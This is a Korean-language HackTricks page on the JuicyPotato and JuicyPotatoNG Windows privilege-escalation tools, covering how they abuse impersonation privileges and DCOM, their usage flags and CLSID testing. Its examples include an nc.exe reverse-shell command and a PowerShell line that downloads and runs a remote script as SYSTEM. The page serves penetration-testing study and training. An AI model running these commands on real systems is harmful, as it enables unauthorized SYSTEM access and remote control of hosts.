# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato는 레거시입니다. 일반적으로 Windows 10 1803 / Windows Server 2016까지의 버전에서 동작합니다. Windows 10 1809 / Server 2019부터 적용된 Microsoft의 하드닝 변경으로 원래 기법이 깨졌습니다. 해당 빌드 및 이후 버전에서는 PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato 등과 같은 최신 대안을 고려하세요. 최신 옵션과 사용법은 아래 페이지를 참조하세요.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (골든 권한 악용) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### 호환성 요약

- 현재 컨텍스트에 SeImpersonatePrivilege 또는 SeAssignPrimaryTokenPrivilege가 있을 경우 Windows 10 1803 및 Windows Server 2016까지 신뢰성 있게 동작합니다.
- Windows 10 1809 / Windows Server 2019 및 이후 버전에서는 Microsoft의 하드닝으로 인해 동작하지 않습니다. 해당 빌드들에서는 위에 링크된 대안들을 사용하는 것을 권장합니다.

### 요약 <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

우리는 [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)를 무기화하기로 결정했습니다: Juicy Potato를 소개합니다.

> 이론은 [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)을 참조하세요.

`BITS` 외에도 남용할 수 있는 여러 COM 서버가 있다는 것을 발견했습니다. 이들은 다음을 충족해야 합니다:

1. 현재 사용자(일반적으로 impersonation 권한이 있는 “service user”)로 인스턴스화할 수 있을 것
2. `IMarshal` 인터페이스를 구현할 것
3. 상승된 사용자로 실행될 것 (SYSTEM, Administrator 등)

몇 차례의 테스트 후 여러 Windows 버전에서 [흥미로운 CLSID들](http://ohpe.it/juicy-potato/CLSID/)의 광범위한 목록을 얻고 테스트했습니다.

### 자세한 내용 <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato를 사용하면 다음을 수행할 수 있습니다:

- **Target CLSID** _원하는 CLSID를 선택하십시오._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _에서 OS별로 정리된 목록을 찾을 수 있습니다._
- **COM Listening port** _기본 하드코딩된 6666 대신 원하는 COM 리스닝 포트를 정의할 수 있습니다._
- **COM Listening IP address** _서버를 원하는 IP에 바인딩할 수 있습니다._
- **Process creation mode** _임퍼스네이트된 사용자의 권한에 따라 다음 중 선택할 수 있습니다:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _익스플로잇이 성공하면 실행할 실행파일이나 스크립트를 지정합니다._
- **Process Argument** _실행할 프로세스의 인수를 커스터마이즈합니다._
- **RPC Server address** _은밀한 접근을 위해 외부 RPC 서버에 인증할 수 있습니다._
- **RPC Server port** _외부 서버에 인증하고 싶지만 방화벽이 포트 `135`를 차단하는 경우 유용합니다…_
- **TEST mode** _주로 테스트 목적(예: CLSID 테스트)을 위한 모드입니다. DCOM을 생성하고 토큰의 사용자를 출력합니다. 테스트 관련 내용은_ [_here for testing_](http://ohpe.it/juicy-potato/Test/) _을 참조하세요._

### 사용법 <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

사용자에게 `SeImpersonate` 또는 `SeAssignPrimaryToken` 권한이 있으면 당신은 **SYSTEM**입니다.

이들 COM Servers의 남용을 모두 방지하는 것은 거의 불가능합니다. `DCOMCNFG`를 통해 이러한 객체들의 권한을 수정하는 것을 생각해 볼 수 있지만, 성공하기는 매우 어려울 것입니다.

실질적인 해결책은 `* SERVICE` 계정으로 실행되는 민감한 계정과 애플리케이션을 보호하는 것입니다. `DCOM`을 중단하면 이 익스플로잇을 억제할 수 있겠지만, 기반 OS에 심각한 영향을 미칠 수 있습니다.

출처: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG는 다음을 결합하여 최신 Windows에서 JuicyPotato-style local privilege escalation을 재도입합니다:
- 선택한 포트에서 로컬 RPC 서버로의 DCOM OXID 해상도를 사용하여 이전에 하드코딩된 127.0.0.1:6666 리스너를 피함.
- RpcImpersonateClient 없이 들어오는 SYSTEM 인증을 캡처하고 대리(impersonate)할 수 있는 SSPI 훅; 또한 오직 `SeAssignPrimaryTokenPrivilege`만 있는 경우에 `CreateProcessAsUser`도 가능하게 함.
- PrintNotify / ActiveX Installer Service 클래스를 타깃으로 할 때 이전의 `INTERACTIVE`-group 요건과 같은 DCOM 활성화 제약을 만족시키기 위한 트릭들.

중요 참고(빌드별로 동작이 변경됨):
- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

Basic usage (more flags in the help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
만약 목표가 Windows 10 1809 / Server 2019이고 classic JuicyPotato가 패치되어 있다면, 상단에 링크된 대안들(RoguePotato, PrintSpoofer, EfsPotato/GodPotato 등)을 사용하는 것이 좋습니다. NG는 빌드 및 서비스 상태에 따라 달라질 수 있습니다.

## 예제

참고: 시도할 CLSID 목록은 [this page](https://ohpe.it/juicy-potato/CLSID/)를 참조하세요.

### nc.exe reverse shell 얻기
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### RDP 접근 권한이 있는 경우 새 CMD 실행

![](<../../images/image (300).png>)

## CLSID 문제

종종 JuicyPotato가 사용하는 기본 CLSID는 **작동하지 않아** 익스플로잇이 실패합니다. 일반적으로 **작동하는 CLSID**를 찾기 위해 여러 번 시도해야 합니다. 특정 운영체제에서 시도할 CLSID 목록을 얻으려면 다음 페이지를 방문하세요:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **CLSID 확인**

먼저 juicypotato.exe 외에 몇몇 실행 파일이 필요합니다.

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1)를 다운로드하여 PS 세션에 로드하고, [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)을 다운로드하여 실행하세요. 해당 스크립트는 테스트할 가능한 CLSID 목록을 생성합니다.

그런 다음 [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(CLSID 목록 경로와 juicypotato 실행 파일 경로를 변경) 를 다운로드하여 실행하세요. 이 배치 파일은 모든 CLSID를 차례로 시도하며, 포트 번호가 변경되면 **해당 CLSID가 작동한 것**을 의미합니다.

**파라미터 -c를 사용하여** 작동하는 CLSID를 **확인하세요**

## 참고자료

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
